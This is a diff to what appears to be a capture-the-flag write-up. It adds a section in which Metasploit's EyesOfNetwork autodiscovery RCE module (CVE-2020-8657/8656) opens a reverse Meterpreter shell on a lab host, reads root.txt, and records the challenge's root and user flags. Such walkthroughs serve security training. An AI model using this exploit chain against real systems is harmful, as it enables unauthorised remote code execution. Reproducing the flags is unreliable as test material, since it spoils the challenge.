@@ -178,6 +178,61 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 #### sql injection
 hasn't worked
 
+#### meterpreter
+the running version (5.2) is vulnerable to RCE
+```bash
+$ msfconsole
+
+> use exploit/linux/http/eyesofnetwork_autodiscovery_rce
+msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > set RHOSTS 192.168.10.18
+
+msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > exploit
+
+[*] Started reverse TCP handler on 192.168.9.5:1337 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Target is EyesOfNetwork 5.3 or older with API version 2.4.2.
+[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.
+[*] Using generated API key: 41a41f52395de8a08c2de5e1e80ab6f47f5655a53738ec9848f52171143e90d3
+[+] Authenticated as user hwAENgHt
+[*] Command Stager progress - 100.00% done (897/897 bytes)
+[*] Sending stage (3020772 bytes) to 192.168.10.18
+[*] Meterpreter session 1 opened (192.168.9.5:1337 -> 192.168.10.18:51476 ) at 2022-06-13 17:12:54 +0200
+
+meterpreter > ls /
+Listing: /
+==========
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  0      fil   2021-04-03 16:50:18 +0200  .autorelabel
+040555/r-xr-xr-x  36864  dir   2021-04-03 19:01:30 +0200  bin
+040555/r-xr-xr-x  4096   dir   2021-04-03 19:00:33 +0200  boot
+040755/rwxr-xr-x  3120   dir   2022-06-13 09:30:57 +0200  dev
+040755/rwxr-xr-x  12288  dir   2022-06-13 09:30:58 +0200  etc
+040755/rwxr-xr-x  4096   dir   2021-04-03 16:37:42 +0200  home
+040555/r-xr-xr-x  4096   dir   2021-04-03 16:37:53 +0200  lib
+040555/r-xr-xr-x  36864  dir   2021-04-03 16:38:08 +0200  lib64
+040700/rwx------  16384  dir   2021-04-03 16:34:51 +0200  lost+found
+040755/rwxr-xr-x  4096   dir   2018-04-11 06:59:55 +0200  media
+040755/rwxr-xr-x  4096   dir   2018-04-11 06:59:55 +0200  mnt
+040755/rwxr-xr-x  4096   dir   2018-04-11 06:59:55 +0200  opt
+040555/r-xr-xr-x  0      dir   2022-06-13 09:30:51 +0200  proc
+040550/r-xr-x---  4096   dir   2022-06-13 10:03:04 +0200  root
+100644/rw-r--r--  44     fil   2022-05-15 16:57:57 +0200  root.txt
+040755/rwxr-xr-x  1000   dir   2022-06-13 10:03:04 +0200  run
+040555/r-xr-xr-x  16384  dir   2021-04-03 16:38:04 +0200  sbin
+040755/rwxr-xr-x  4096   dir   2021-04-03 16:37:17 +0200  share
+040755/rwxr-xr-x  4096   dir   2021-04-03 16:43:07 +0200  srv
+040555/r-xr-xr-x  0      dir   2022-06-13 09:30:53 +0200  sys
+041777/rwxrwxrwx  4096   dir   2022-06-13 17:12:55 +0200  tmp
+040755/rwxr-xr-x  4096   dir   2021-04-03 16:35:14 +0200  usr
+040755/rwxr-xr-x  4096   dir   2021-04-03 16:43:04 +0200  var
+
+meterpreter > cat /root.txt
+cyberctfd{cROGRMZeGLNFZ3XIfaeaKoT2OKTB4qhM}
+
+```
+
 
 ## influx
 
@@ -190,3 +245,4 @@ $ nflux -precision rfc339 -host $IP
 
 ## Flags
 User: `cyberctfd{r5KYSTQmMve4KVIoaeaVQH4NUfD7caR6}`
+Root: `cyberctfd{cROGRMZeGLNFZ3XIfaeaKoT2OKTB4qhM}`
